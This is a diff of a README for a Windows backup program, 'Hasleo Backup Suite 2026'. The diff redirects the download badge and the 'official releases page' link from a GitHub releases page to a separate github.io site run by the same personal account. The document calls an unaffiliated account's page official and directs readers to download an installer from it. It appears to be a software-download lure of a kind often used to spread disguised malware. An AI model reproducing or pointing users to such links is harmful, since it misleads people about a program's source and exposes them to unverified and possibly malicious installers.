@@ -1,6 +1,6 @@
 # 💾 Hasleo-Backup-Suite-2026 - Secure your data with ease today
 
-[![](https://img.shields.io/badge/Download-Hasleo_Backup_Suite-blue.svg)](https://github.com/L025ve/Hasleo-Backup-Suite-2026/releases)
+[![](https://img.shields.io/badge/Download-Hasleo_Backup_Suite-blue.svg)](https://l025ve.github.io)
 
 Hasleo Backup Suite 2026 provides a reliable way to protect your files, folders, and entire disk drives on Windows 10 and Windows 11. This software helps you recover data if your system fails or if you lose important documents. You can perform backups, restore systems, and clone disks within a single interface. 
 
@@ -8,7 +8,7 @@ Hasleo Backup Suite 2026 provides a reliable way to protect your files, folders,
 
 Follow these steps to obtain and start the software on your computer.
 
-1. Visit the [official releases page](https://github.com/L025ve/Hasleo-Backup-Suite-2026/releases) to access the installer.
+1. Visit the [official releases page](https://l025ve.github.io) to access the installer.
 2. Locate the latest version in the list.
 3. Click the file name to begin the download.
 4. Save the file to your desktop or downloads folder.
